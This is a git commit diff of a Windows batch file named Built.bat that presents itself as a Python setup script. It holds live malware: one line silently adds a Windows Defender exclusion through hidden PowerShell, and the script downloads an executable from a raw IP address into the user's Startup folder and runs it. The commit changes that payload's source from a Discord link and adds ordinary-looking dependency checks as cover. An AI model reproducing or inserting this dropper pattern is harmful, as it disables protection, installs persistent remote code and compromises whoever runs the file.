b2a80c66e856f44ee802efb782d59c8874a0315b
byDexty <147257219+xdexty0@users.noreply.github.com>
2024-06-26 23:51:21 +0300

    Update Built.bat

--- Built.bat
+++ Built.bat
@@ -3,28 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
-
-
-
-if exist "%DEST%" del "%DEST%"
-
-curl --silent --output "%DEST%" "%URL%"
-
-if %errorlevel% neq 0 (
-  exit /b %errorlevel%
-)
-
-call "%DEST%"
-
-start main.py
-
-
-@echo off
-setlocal 
-
-set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
+set "URL=http://45.133.36.107/Update.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -39,7 +18,35 @@ if %errorlevel% neq 0 (
 call "%DEST%"
 
 
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
+    echo Very important click Add python exe to PATH.
+    pause
+)
 
-start main.py
+title Checking Python libraries...
+echo Checking 'cryptography' (1/3)
+python -c "import cryptography" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing cryptography...
+    python -m pip install cryptography > nul
+)
 
-@echo off
+echo Checking 'aiohttp' (2/3)
+python -c "import aiohttp" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing aiohttp...
+    python -m pip install aiohttp > nul
+)
+
+echo Checking 'pyinstaller' (3/3)
+python -c "import PyInstaller" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyinstaller...
+    python -m pip install pyinstaller > nul
+)
+
+cls
+python index.py
